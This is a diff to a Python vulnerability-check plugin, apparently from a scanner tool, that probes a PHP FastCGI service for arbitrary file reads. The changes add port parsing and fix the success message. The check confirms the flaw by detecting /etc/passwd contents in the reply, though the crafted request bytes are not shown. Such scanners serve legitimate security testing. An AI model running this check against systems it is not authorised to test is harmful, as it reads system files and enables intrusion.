@@ -18,18 +18,20 @@ class php_fastcgi_read_BaseVerify:
         self.url = url
 
     def run(self):
-        headers = {
-            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
-        }
+        port = 9000
         if r"http" in self.url:
-        #提取host
+            #提取host
             host = urlparse(self.url)[1]
+            try:
+                port = int(host.split(':')[1])
+            except:
+                pass
             flag = host.find(":")
             if flag != -1:
                 host = host[:flag]
         else:
             host = self.url
-        port = 9000
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(6.0)
         try:
@@ -53,7 +55,7 @@ class php_fastcgi_read_BaseVerify:
             sock.send(data_s)
             ret = sock.recv(1024).decode()
             if ret.find("root:") > 0 and ret.find("/bin/bash") > 0:
-                    cprint("[+]存在php fastcgi任意文件读取漏洞漏洞...(高危)\tpayload: "+vulnurl, "red")                
+                    cprint("[+]存在php fastcgi任意文件读取漏洞漏洞...(高危)\tpayload: "+host+":"+str(port), "red")
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
